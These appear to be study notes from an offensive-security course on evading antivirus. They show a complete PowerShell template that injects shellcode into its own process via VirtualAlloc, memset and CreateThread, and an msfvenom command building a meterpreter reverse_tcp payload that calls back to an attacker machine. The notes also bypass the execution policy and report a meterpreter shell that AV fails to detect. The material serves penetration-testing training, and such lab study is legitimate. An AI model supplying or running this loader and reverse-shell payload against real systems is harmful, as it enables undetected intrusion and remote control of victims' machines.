We will use a technique similar to the one described in Remote Process Memory Injection section. The difference is the fact that we will target the currently executing process, in this case the PowerShell interpreter. 

Powershell has the ability to interact with the Windows API. Allowing us to implement the in-memory injectino process in a PS script. 

The main benefit of executing a script rather than a PE is that it's difficult for AV to determine if it's malicious or not as it's run inside and interpreter and the script itself isn't executable code. 

Some AV products are better and handling malicious script detection.

Additionally, scripts are easily modified (var names, comments, logic, etc) without the need to re-compile. 

### Basic Template script for in-memory injection
```
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
$winFunc =
Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i),
$sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

Script starts by importing VirtualAlloc and CreateThread from kernel32.dll and memset from msvcrt.dll. 

These functions allocate memory, create execution thread and write arbitrary data to allocated memory. 

Note that we are allocating memoery and exeucitn a new thread in the current process (powershell.exe) instead of a remote one.

Script then allocated a block of memory using VirtualAlloc, takes each byte of the payload stored in the $sc array, and writes it to our newly allocated memory block using memset.

As a final step, our in-memory payload is executed in a seperate thread usine CreateThread. 

Missing from the script is a payload, which can be generated using msfvenom. 

We will use the reverse_tcp payload:
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f
powershell`

Output can be copied to our vinal script after renaming the $buf variable from msfvenom to $sc as required by our script. 

AV doesn't pick it up, but we run into an error that references the Execution Policies of the system when we attempt to run it. 

References show that Execution Policies are generally set on a per-user basis rather then per-system. 

***
Keep in mind that much like anything in Windows, the PowerShell Execution
Policy settings can be dictated by one or more Active Directory GPOs.430 In those cases it may be necessary to look for additional bypass vectors.
***

We can attempt to view and change the policy for the current user. 

Alternatively we can bypass this on a per-script basis with the **-ExecutionPolicy Bypass** flag for each script as it's run.


Example:
```
C:\Users\offsec\Desktop> powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
Undefined

PS C:\Users\offsec\Desktop> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope
CurrentUser

PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
Unrestricted
```

### Kali:
Setup a reverse tcp handler on our kali box

### Windows:
Launch the script:
`.\av_test.ps1`

We receive a meterpreter shell on our attack machine.
